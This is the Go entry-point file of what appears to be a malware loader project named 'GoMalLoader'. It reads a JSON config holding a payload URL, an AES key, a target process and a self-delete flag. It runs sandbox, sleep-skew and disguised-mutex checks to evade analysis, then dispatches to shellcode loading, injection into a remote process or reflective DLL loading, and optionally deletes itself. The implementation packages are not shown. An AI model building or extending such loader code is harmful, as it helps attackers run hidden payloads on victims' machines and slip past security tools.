package main

import (
	"encoding/json"
	"log"
	"os"

	"GoMalLoader/loader"
	"GoMalLoader/utils"
)

type Config struct {
	Mode          string `json:"mode"`
	Source        string `json:"source"`
	Path          string `json:"path"`
	URL           string `json:"url"`
	AESKey        string `json:"aes_key"`
	TargetProcess string `json:"target_process"`
	Obfuscated    bool   `json:"obfuscated"`
	SelfDelete    bool   `json:"self_delete"`
}

func loadConfig() loader.LoaderConfig {
	f, err := os.Open("config.json")
	if err != nil {
		log.Fatalf("error reading config: %v", err)
	}
	defer f.Close()

	var cfg loader.LoaderConfig
	if err := json.NewDecoder(f).Decode(&cfg); err != nil {
		log.Fatalf("error decoding config: %v", err)
	}
	return cfg
}

func main() {
	utils.CheckMutex("Global\\WinInitLock")
	utils.CheckSandbox()
	utils.CheckSleepSkew()

	cfg := loadConfig()

	switch cfg.Mode {
	case "shellcode":
		loader := loader.NewShellcodeLoader()
		if err := loader.Run(cfg); err != nil {
			log.Fatalf("shellcode loader error: %v", err)
		}
	case "inject_remote":
		injector := loader.NewRemoteInjector()
		if err := injector.Inject(cfg); err != nil {
			log.Fatalf("remote injector error: %v", err)
		}
	case "dll_reflective":
		reflectiveLoader := loader.NewReflectiveLoader()
		if err := reflectiveLoader.Load(cfg); err != nil {
			log.Fatalf("reflective loader error: %v", err)
		}
	default:
		log.Fatalf("invalid mode: %s", cfg.Mode)
	}

	if cfg.SelfDelete {
		utils.SelfDelete()
	}
}
